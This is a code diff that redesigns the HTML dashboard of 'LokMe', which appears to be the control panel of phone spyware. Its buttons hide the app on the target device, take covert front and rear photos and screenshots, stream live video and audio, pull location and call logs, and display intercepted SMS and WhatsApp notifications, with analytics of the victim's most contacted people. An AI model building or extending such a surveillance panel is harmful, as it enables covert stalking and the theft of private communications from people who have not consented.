@@ -3,111 +3,164 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>LokMe — Admin Dashboard</title>
+  <title>LokMe — Nexus Dashboard</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/chart.js@4.4.7/dist/chart.min.css" />
   <link rel="stylesheet" href="style.css" />
 </head>
 <body>
+  <div id="bgCanvas"></div>
   <div class="app">
-    <!-- Sidebar Overlay -->
-    <div class="sidebar-overlay" id="sidebarOverlay" onclick="closeSidebar()"></div>
-
-    <!-- Hamburger -->
-    <button class="hamburger" id="hamburger" onclick="toggleSidebar()">&#9776;</button>
-
     <!-- Sidebar -->
     <aside class="sidebar" id="sidebar">
+      <div class="sidebar-glow"></div>
       <div class="logo">
-        <div class="logo-icon">L</div>
+        <div class="logo-icon">
+          <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><circle cx="12" cy="12" r="3"/><path d="M12 1v2"/><path d="M12 21v2"/><path d="M4.22 4.22l1.42 1.42"/><path d="M18.36 18.36l1.42 1.42"/><path d="M1 12h2"/><path d="M21 12h2"/><path d="M4.22 19.78l1.42-1.42"/><path d="M18.36 5.64l1.42-1.42"/></svg>
+        </div>
         <div>
           <h2>LokMe</h2>
-          <span>Admin Dashboard</span>
+          <span>Nexus Dashboard</span>
         </div>
       </div>
 
       <nav>
         <div class="nav-section-label">Monitor</div>
         <button class="nav-btn active" data-section="devices">
-          <span class="nav-icon">&#9679;</span> Devices
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="4" y="2" width="16" height="20" rx="2"/><line x1="12" y1="18" x2="12.01" y2="18"/></svg>
+          Devices
         </button>
         <button class="nav-btn" data-section="notifications">
-          <span class="nav-icon">&#9993;</span> Notifications
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9"/><path d="M13.73 21a2 2 0 0 1-3.46 0"/></svg>
+          Live Feed
         </button>
 
-        <div class="nav-section-label">Data</div>
+        <div class="nav-section-label">History</div>
         <button class="nav-btn" data-section="calllogs">
-          <span class="nav-icon">&#9742;</span> Call Logs
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"/></svg>
+          Call Logs
         </button>
         <button class="nav-btn" data-section="photos">
-          <span class="nav-icon">&#128247;</span> Photos
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="18" height="18" rx="2"/><circle cx="8.5" cy="8.5" r="1.5"/><path d="M21 15l-5-5L5 21"/></svg>
+          Media
         </button>
         <button class="nav-btn" data-section="commands">
-          <span class="nav-icon">&#9881;</span> Commands
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="16 3 21 3 21 8"/><line x1="4" y1="20" x2="21" y2="3"/><polyline points="21 16 21 21 16 21"/><line x1="15" y1="15" x2="21" y2="21"/><line x1="4" y1="4" x2="9" y2="9"/></svg>
+          Commands
         </button>
 
         <div class="nav-section-label">System</div>
         <button class="nav-btn" data-section="storage">
-          <span class="nav-icon">&#128451;</span> Storage
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><ellipse cx="12" cy="5" rx="9" ry="3"/><path d="M21 12c0 1.66-4 3-9 3s-9-1.34-9-3"/><path d="M3 5v14c0 1.66 4 3 9 3s9-1.34 9-3V5"/></svg>
+          Storage
         </button>
       </nav>
 
       <div class="sidebar-footer">
         <div class="server-status">
-          <span id="wsStatus" class="status-dot disconnected"></span>
-          <span id="wsLabel">Disconnected</span>
+          <span id="wsStatus" class="status-dot"></span>
+          <span id="wsLabel">Connecting...</span>
         </div>
       </div>
     </aside>
 
     <!-- Main Content -->
     <main class="content">
-      <!-- ===== DEVICES SECTION ===== -->
+      <!-- ===== DEVICES ===== -->
       <section id="sec-devices" class="section active">
         <div class="section-header">
-          <h1>Devices</h1>
+          <div>
+            <h1>Device Overview</h1>
+            <p class="subtitle">Monitor connected devices in real-time</p>
+          </div>
           <div class="header-actions">
-            <button class="btn btn-secondary" onclick="refreshDevices()">&#8635; Refresh</button>
+            <button class="btn btn-glass btn-sm" onclick="refreshDevices()">
+              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="23 4 23 10 17 10"/><path d="M20.49 15a9 9 0 1 1-2.12-9.36L23 10"/></svg>
+              Refresh
+            </button>
           </div>
         </div>
+
+        <!-- Stats row -->
+        <div class="stats-row" id="dashboardStats">
+          <div class="stat-pill"><span class="stat-pill-value" id="statDevices">0</span><span>Devices</span></div>
+          <div class="stat-pill"><span class="stat-pill-value" id="statOnline">0</span><span>Online</span></div>
+          <div class="stat-pill"><span class="stat-pill-value" id="statNotifs">0</span><span>Notifs Today</span></div>
+          <div class="stat-pill"><span class="stat-pill-value" id="statPhotos">0</span><span>Photos</span></div>
+          <div class="stat-pill"><span class="stat-pill-value" id="statCalls">0</span><span>Call Logs</span></div>
+        </div>
+
         <div id="deviceList" class="card-grid"></div>
 
-        <!-- Device Detail Panel -->
+        <!-- Device Detail -->
         <div id="deviceDetail" class="hidden">
           <div class="section-header">
-            <h2 id="detailTitle">Device</h2>
+            <div>
+              <h2 id="detailTitle">Device</h2>
+              <p class="subtitle" id="detailSub">Connected · Last seen now</p>
+            </div>
             <div class="header-actions">
-              <button class="btn btn-outline btn-sm" onclick="deleteDeviceNotifications()">Clear Notifs</button>
-              <button class="btn btn-outline btn-sm" onclick="deleteDeviceCallLogs()">Clear Calls</button>
-              <button class="btn btn-outline btn-sm" onclick="deleteDevicePhotos()">Clear Photos</button>
-              <button class="btn btn-outline btn-sm" onclick="deleteDeviceLocations()">Clear Locations</button>
-              <button class="btn btn-danger btn-sm" onclick="deleteAllDeviceData()">Delete All Data</button>
-              <button class="btn btn-secondary btn-sm" onclick="showDeviceList()">&#8592; Back</button>
+              <button class="btn btn-outline btn-sm" onclick="showDeviceList()">
+                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg>
+                Back
+              </button>
             </div>
           </div>
 
-          <!-- Command Buttons -->
-            <div class="command-bar">
-            <button class="btn btn-danger" onclick="sendCommand('LOCK_DEVICE')">&#128274; Lock</button>
-            <button class="btn btn-primary" onclick="promptDialog()">&#128172; Dialog</button>
-            <button class="btn btn-primary" onclick="sendCommand('GET_LOCATION')">&#128204; Location</button>
-            <button class="btn btn-primary" onclick="sendCommand('GET_CALL_LOG')">&#9742; Call Log</button>
-            <button class="btn btn-primary" onclick="capturePhoto(false)">&#128247; Photo Back</button>
-            <button class="btn btn-primary" onclick="capturePhoto(true)">&#128247; Photo Front</button>
-            <button class="btn btn-secondary" onclick="sendCommand('CAPTURE_SCREEN')">&#128424; Screenshot</button>
-            <button class="btn btn-secondary" onclick="sendCommand('HIDE_APP')">&#128064; Hide</button>
-            <button class="btn btn-primary" onclick="sendCommand('SHOW_APP')">&#128065; Show</button>
+          <!-- Command Grid -->
+          <div class="cmd-grid">
+            <button class="cmd-btn cmd-danger" onclick="sendCommand('LOCK_DEVICE')">
+              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+              <span>Lock</span>
+            </button>
+            <button class="cmd-btn cmd-primary" onclick="promptDialog()">
+              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>
+              <span>Dialog</span>
+            </button>
+            <button class="cmd-btn cmd-primary" onclick="sendCommand('GET_LOCATION')">
+              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"/><circle cx="12" cy="10" r="3"/></svg>
+              <span>Location</span>
+            </button>
+            <button class="cmd-btn cmd-primary" onclick="sendCommand('GET_CALL_LOG')">
+              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"/></svg>
+              <span>Call Log</span>
+            </button>
+            <button class="cmd-btn cmd-primary" onclick="capturePhoto(false)">
+              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"/><circle cx="12" cy="13" r="4"/></svg>
+              <span>Photo</span>
+            </button>
+            <button class="cmd-btn cmd-primary" onclick="capturePhoto(true)">
+              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"/><circle cx="12" cy="13" r="4"/><path d="M12 9v8"/><path d="M8 13h8"/></svg>
+              <span>Selfie</span>
+            </button>
+            <button class="cmd-btn cmd-secondary" onclick="sendCommand('CAPTURE_SCREEN')">
+              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="3" width="20" height="14" rx="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg>
+              <span>Screen</span>
+            </button>
+            <button class="cmd-btn cmd-secondary" onclick="sendCommand('HIDE_APP')">
+              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19"/><line x1="1" y1="1" x2="23" y2="23"/></svg>
+              <span>Hide</span>
+            </button>
+            <button class="cmd-btn cmd-secondary" onclick="sendCommand('SHOW_APP')">
+              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
+              <span>Show</span>
+            </button>
           </div>
 
-          <!-- Live Video Stream -->
-          <div class="data-section" id="videoSection">
-            <div class="section-subheader">
-              <h3>Live Stream</h3>
+          <!-- Live Stream -->
+          <div class="glass-card" id="videoSection">
+            <div class="card-header">
+              <h3>
+                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="23 7 16 12 23 17 23 7"/><rect x="1" y="5" width="15" height="14" rx="2"/></svg>
+                Live Stream
+              </h3>
               <div class="header-actions">
-                <label style="color:var(--text-sec);font-size:13px;display:flex;align-items:center;gap:6px;cursor:pointer">
-                  <input type="checkbox" id="audioToggle" checked /> Audio
-                </label>
-                <button class="btn btn-primary btn-sm" onclick="startVideoStream(false)">Back Camera</button>
-                <button class="btn btn-primary btn-sm" onclick="startVideoStream(true)">Front Camera</button>
+                <label class="toggle-label"><input type="checkbox" id="audioToggle" checked /> Audio</label>
+                <button class="btn btn-glass btn-sm" onclick="startVideoStream(false)">Back</button>
+                <button class="btn btn-glass btn-sm" onclick="startVideoStream(true)">Front</button>
                 <button class="btn btn-danger btn-sm" onclick="stopVideoStream()">Stop</button>
               </div>
             </div>
@@ -120,155 +173,204 @@
             </div>
           </div>
 
-          <!-- Map -->
-          <div id="map" class="map-container"></div>
-          <div id="locationInfo" class="info-bar hidden"></div>
+          <!-- Map + Location -->
+          <div class="glass-card">
+            <div class="card-header">
+              <h3>
+                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"/><circle cx="12" cy="10" r="3"/></svg>
+                Location
+              </h3>
+            </div>
+            <div id="map" class="map-container"></div>
+            <div id="locationInfo" class="info-bar hidden"></div>
+            <div id="deviceLocations" class="table-container hidden"></div>
+          </div>
 
-          <!-- Call Logs (device) -->
-          <div class="data-section">
-            <div class="section-subheader">
-              <h3>Call Logs</h3>
+          <!-- Call Logs -->
+          <div class="glass-card">
+            <div class="card-header">
+              <h3>
+                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"/></svg>
+                Commands
+              </h3>
             </div>
             <div id="commandHistory" class="table-container"></div>
           </div>
 
-          <!-- Photos (device) -->
-          <div class="data-section">
-            <div class="section-subheader">
-              <h3>Device Photos</h3>
+          <!-- Photos -->
+          <div class="glass-card">
+            <div class="card-header">
+              <h3>
+                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="18" height="18" rx="2"/><circle cx="8.5" cy="8.5" r="1.5"/><path d="M21 15l-5-5L5 21"/></svg>
+                Photos
+              </h3>
             </div>
             <div id="devicePhotos" class="photo-grid"></div>
           </div>
 
-          <!-- Notifications (device) -->
-          <div class="data-section">
-            <div class="section-subheader">
-              <h3>Notifications</h3>
+          <!-- Notifications -->
+          <div class="glass-card">
+            <div class="card-header">
+              <h3>
+                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9"/><path d="M13.73 21a2 2 0 0 1-3.46 0"/></svg>
+                Notifications
+              </h3>
             </div>
             <div id="deviceNotifications" class="table-container"></div>
-          </div>
-
-          <!-- Location History (device) -->
-          <div class="data-section">
-            <div class="section-subheader">
-              <h3>Location History</h3>
-            </div>
-            <div id="deviceLocations" class="table-container"></div>
           </div>
         </div>
       </section>
 
-      <!-- ===== NOTIFICATIONS SECTION ===== -->
+      <!-- ===== NOTIFICATIONS / LIVE FEED ===== -->
       <section id="sec-notifications" class="section">
         <div class="section-header">
           <div>
-            <h1>Notifications</h1>
-            <p style="color:var(--text-ter);font-size:13px;margin-top:4px">SMS, WhatsApp, and other messaging apps</p>
+            <h1>Live Feed</h1>
+            <p class="subtitle">SMS, WhatsApp & app notifications in real-time</p>
           </div>
           <div class="header-actions">
-            <button class="btn btn-danger" onclick="clearAllNotifications()">Clear All</button>
-            <button class="btn btn-secondary" onclick="refreshNotifications()">&#8635; Refresh</button>
+            <button class="btn btn-danger btn-sm" onclick="clearAllNotifications()">Clear All</button>
+            <button class="btn btn-glass btn-sm" onclick="refreshNotifications()">Refresh</button>
           </div>
         </div>
         <div id="notifList" class="table-container"></div>
       </section>
 
-      <!-- ===== CALL LOGS SECTION ===== -->
+      <!-- ===== CALL LOGS ===== -->
       <section id="sec-calllogs" class="section">
         <div class="section-header">
           <div>
             <h1>Call Logs</h1>
-            <p style="color:var(--text-ter);font-size:13px;margin-top:4px">Incoming, outgoing, and missed calls</p>
+            <p class="subtitle">Incoming, outgoing & missed calls across devices</p>
           </div>
           <div class="header-actions">
-            <button class="btn btn-danger" onclick="clearAllCallLogs()">Clear All</button>
-            <button class="btn btn-secondary" onclick="refreshCallLogs()">&#8635; Refresh</button>
+            <button class="btn btn-danger btn-sm" onclick="clearAllCallLogs()">Clear All</button>
+            <button class="btn btn-glass btn-sm" onclick="refreshCallLogs()">Refresh</button>
           </div>
         </div>
         <div id="callLogsList" class="table-container"></div>
       </section>
 
-      <!-- ===== PHOTOS SECTION ===== -->
+      <!-- ===== MEDIA ===== -->
       <section id="sec-photos" class="section">
         <div class="section-header">
           <div>
-            <h1>Photos</h1>
-            <p style="color:var(--text-ter);font-size:13px;margin-top:4px">All captured photos from all devices</p>
+            <h1>Media Gallery</h1>
+            <p class="subtitle">All captured photos & screenshots</p>
           </div>
           <div class="header-actions">
-            <button class="btn btn-danger" onclick="clearAllPhotos()">Delete All</button>
-            <button class="btn btn-secondary" onclick="refreshPhotos()">&#8635; Refresh</button>
+            <button class="btn btn-danger btn-sm" onclick="clearAllPhotos()">Delete All</button>
+            <button class="btn btn-glass btn-sm" onclick="refreshPhotos()">Refresh</button>
           </div>
         </div>
         <div id="photoGrid" class="photo-grid"></div>
       </section>
 
-      <!-- ===== COMMANDS SECTION ===== -->
+      <!-- ===== COMMANDS ===== -->
       <section id="sec-commands" class="section">
         <div class="section-header">
           <div>
-            <h1>Command History</h1>
-            <p style="color:var(--text-ter);font-size:13px;margin-top:4px">All commands sent to all devices</p>
+            <h1>Command Center</h1>
+            <p class="subtitle">All commands sent to devices</p>
           </div>
           <div class="header-actions">
-            <button class="btn btn-danger" onclick="clearAllCommands()">Clear All</button>
-            <button class="btn btn-secondary" onclick="refreshAllCommands()">&#8635; Refresh</button>
+            <button class="btn btn-danger btn-sm" onclick="clearAllCommands()">Clear</button>
+            <button class="btn btn-glass btn-sm" onclick="refreshAllCommands()">Refresh</button>
           </div>
         </div>
         <div id="allCommands" class="table-container"></div>
       </section>
 
-      <!-- ===== STORAGE SECTION ===== -->
+      <!-- ===== STORAGE + ANALYTICS ===== -->
       <section id="sec-storage" class="section">
         <div class="section-header">
           <div>
-            <h1>Storage &amp; Data</h1>
-            <p style="color:var(--text-ter);font-size:13px;margin-top:4px">System-wide statistics and data management</p>
+            <h1>Analytics & Storage</h1>
+            <p class="subtitle">System-wide statistics, usage patterns & data management</p>
           </div>
           <div class="header-actions">
-            <button class="btn btn-secondary" onclick="refreshStats()">&#8635; Refresh</button>
+            <button class="btn btn-glass btn-sm" onclick="refreshStats()">Refresh</button>
           </div>
         </div>
+
+        <!-- Charts Row -->
+        <div class="charts-row">
+          <div class="glass-card chart-card">
+            <h3 class="chart-title">Data Distribution</h3>
+            <canvas id="chartDoughnut"></canvas>
+          </div>
+          <div class="glass-card chart-card">
+            <h3 class="chart-title">Activity Timeline</h3>
+            <canvas id="chartLine"></canvas>
+          </div>
+        </div>
+
+        <!-- Most Used Apps + Most Contacted -->
+        <div class="charts-row">
+          <div class="glass-card insight-card">
+            <div class="card-header">
+              <h3>
+                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="18" height="18" rx="2"/><circle cx="8.5" cy="8.5" r="1.5"/><path d="M21 15l-5-5L5 21"/></svg>
+                Most Used Apps
+              </h3>
+            </div>
+            <div id="mostUsedApps" class="insight-list">
+              <div class="insight-empty">Loading...</div>
+            </div>
+          </div>
+          <div class="glass-card insight-card">
+            <div class="card-header">
+              <h3>
+                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 0 0-3-3.87"/><path d="M16 3.13a4 4 0 0 1 0 7.75"/></svg>
+                Most Contacted People
+              </h3>
+            </div>
+            <div id="mostContacted" class="insight-list">
+              <div class="insight-empty">Loading...</div>
+            </div>
+          </div>
+        </div>
+
         <div id="storageStats" class="stats-grid"></div>
-        <div class="danger-zone">
+
+        <div class="glass-card danger-zone">
           <h3>&#9888; Danger Zone</h3>
-          <p>Permanently delete all devices and their data from the database. This cannot be undone.</p>
+          <p>Permanently delete all devices and their data. This cannot be undone.</p>
           <button class="btn btn-danger" onclick="nukeAllData()">Delete ALL Data</button>
         </div>
       </section>
 
-      <!-- Confirm Modal -->
+      <!-- Modals -->
       <div id="confirmModal" class="modal hidden">
         <div class="modal-content">
           <h3 id="confirmTitle">Are you sure?</h3>
           <p id="confirmMessage" style="color:var(--text-sec);margin-bottom:16px;font-size:14px"></p>
           <div class="modal-actions">
-            <button class="btn btn-secondary" onclick="closeConfirm()">Cancel</button>
+            <button class="btn btn-outline" onclick="closeConfirm()">Cancel</button>
             <button class="btn btn-danger" id="confirmBtn">Delete</button>
           </div>
         </div>
       </div>
 
-      <!-- Dialog Modal -->
       <div id="dialogModal" class="modal hidden">
         <div class="modal-content">
           <h3>Send Dialog</h3>
           <input type="text" id="dialogTitle" placeholder="Title" value="Alert" />
           <textarea id="dialogMessage" placeholder="Message..." rows="3"></textarea>
           <div class="modal-actions">
-            <button class="btn btn-secondary" onclick="closeModal()">Cancel</button>
+            <button class="btn btn-outline" onclick="closeModal()">Cancel</button>
             <button class="btn btn-primary" onclick="sendDialog()">Send</button>
           </div>
         </div>
       </div>
 
-      <!-- Photo Lightbox -->
+      <!-- Lightbox -->
       <div id="lightbox" class="lightbox hidden" onclick="closeLightbox()">
         <button class="lightbox-close" onclick="closeLightbox()">&times;</button>
         <img id="lightboxImg" src="" alt="full size" />
       </div>
 
-      <!-- Notification Toast Container -->
+      <!-- Notif Toast -->
       <div class="notif-toast-container" id="notifToastContainer"></div>
 
       <!-- Toast -->
@@ -277,6 +379,7 @@
   </div>
 
   <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.7/dist/chart.umd.min.js"></script>
   <script src="app.js"></script>
 </body>
 </html>
